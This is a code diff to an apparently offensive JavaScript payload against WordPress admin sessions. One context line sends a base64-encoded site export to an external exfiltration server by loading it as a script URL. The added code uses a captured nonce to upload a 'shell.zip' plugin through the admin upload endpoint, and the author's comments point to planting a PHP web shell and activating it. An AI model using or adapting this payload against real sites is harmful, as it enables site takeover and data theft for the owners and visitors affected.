@@ -142,7 +142,7 @@ function exportWordPressSite()
 			// off to the external server due to the CORS policy
 			var script = document.createElement("script");
 			script.src = httpExfilServer + "/script/" + btoa(response) + ".js";
-    		document.head.appendChild(script);  
+			document.head.appendChild(script);  
 		}
 	}
 }
@@ -179,6 +179,64 @@ function installYertleShell()
 			console.log("Nonce substring: " + nonceVal);
 
 			// Now we have the nonce, we need to add the plugin....
+
+
+			// This data buffer should be your 
+			// PHP plugin zip file. 
+			// You shouldn't use mine. Don't trust
+			// rando binaries on github. Replace this
+			// with your own. I didn't put anything
+			// extra malicious in there, but why 
+			// should you trust me?
+
+			// Todo - Convert the zip file to a buffer, and 
+			// document how to repeat 
+			var pluginZipFile = "\x00\x00\x00";
+
+			var fileSize = pluginZipFile.length;
+
+			var boundary = "------827901983029388724982374023840";
+
+			var uploadURI = "/wp-admin/update.php?action=upload-plugin";
+
+			uploadXhr = new XMLHttpRequest();
+			uploadXhr.open("POST", uploadURI, true);
+
+			uploadXhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+			// This isn't allowed by browsers. Why did this work in my 
+			// old script... hmmm...
+			//uploadXhr.setRequestHeader("Content-Length", fileSize);
+
+			var body = boundary + "\r\n";
+			body += 'Content-Disposition: form-data; name="_wpnonce"' + '\r\n\r\n';
+			body += nonceVal + "\r\n"; 
+
+			body += boundary + "\r\n";
+			body += 'Content-Disposition: form-data; name="_wp_http_referer"' + "\r\n\r\n";
+			body += "/wp-admin/plugin-install.php" + "\r\n";
+
+
+			body += boundary + "\r\n";
+			body += 'Content-Disposition: form-data; name="pluginzip"; filename="shell.zip"' + "\r\n";
+			body += "Content-Type: application/zip" + "\r\n\r\n";
+			body += pluginZipFile + "\r\n";
+
+			body += boundary + "\r\n";
+			body += 'Content-Disposition: form-data; name="install-plugin-submit"' + "\r\n\r\n";
+			body += "Install Now" + "\r\n";
+			body += boundary;
+
+			var aBody = new Uint8Array(body.length);
+			for (var i = 0; i < aBody.length; i++)
+			{
+				aBody[i] = body.charCodeAt(i);
+			}
+			uploadXhr.send(new Blob([aBody]));
+
+
+			// Don't forget to activate the plugin you numbnut.
+
 		}
 	}
 }
